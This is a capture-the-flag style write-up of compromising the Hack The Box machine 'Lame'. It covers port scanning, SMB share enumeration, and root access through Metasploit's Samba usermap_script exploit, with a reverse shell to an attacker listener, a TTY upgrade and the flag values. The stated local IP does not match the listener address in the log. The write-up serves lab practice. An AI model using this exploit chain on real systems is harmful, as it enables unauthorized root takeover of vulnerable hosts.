# HTB: Lame

## Engagement Overview

**Target:** Lame    
**Box IP:** 10.10.10.3  
**Local IP:** 10.10.10.152  
**Date:** 2025-07-02

---

### Objectives

- Enumerate network services (SMB/FTP/SSH) and writable shares.  
- Exploit Samba (usermap_script) to gain command execution.  
- Escalate to root and capture flags.

---

## Service Enumeration

```bash
nmap -p- --min-rate=1000 -T4 10.10.10.3
```

**Relevant ports discovered:**  
- 21/tcp ftp (vsftpd)  
- 22/tcp ssh  
- 139/tcp netbios-ssn  
- 445/tcp microsoft-ds (Samba)  
- 3632/tcp distccd

SMB shares (from smbmap): `tmp` share is READ,WRITE — usable for uploads.

---

## Initial Access

### SMB foothold

```bash
smbmap -H 10.10.10.3
smbclient -N \\10.10.10.3\tmp
# connected to tmp share and uploaded/executed payload via exploit flow
```

### Exploitation attempted/used

- vsftpd 2.3.4 backdoor (CVE-2011-2523) noted but port filtered/unusable.  
- Successfully used `exploit/multi/samba/usermap_script` (Metasploit) to execute commands, resulting in a reverse shell to attacker listener.

```text
# msf console snippet
msf6 > use exploit/multi/samba/usermap_script
[*] Started reverse TCP handler on 10.10.16.5:4444
[*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.3:43580)
```

Upgraded shell and spawned an interactive TTY:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
id
# uid=0(root) gid=0(root)
```

---

## Privilege Escalation

- Post-exploit TTY indicates root obtained via exploit flow; no additional privesc steps required.

---

## House Cleaning / Post-Exploitation

**Flags:**  
- `user.txt`: `e95ac31f8132e26eac44c2fe58792cfa`  
- `root.txt`: `4f8f2ae18815f97ffdf7975965d6b624`

- Removed any uploaded artifacts where applicable.  

---

## Tools Utilized
- nmap, smbmap, smbclient, metasploit, nc, python

---

## Key Takeaways
- Writable SMB shares are useful for dropping/executing payloads.  
- Samba `usermap_script` exploit remains relevant for legacy systems.  
- Always test multiple attack vectors (FTP, SMB) when initial paths are filtered.
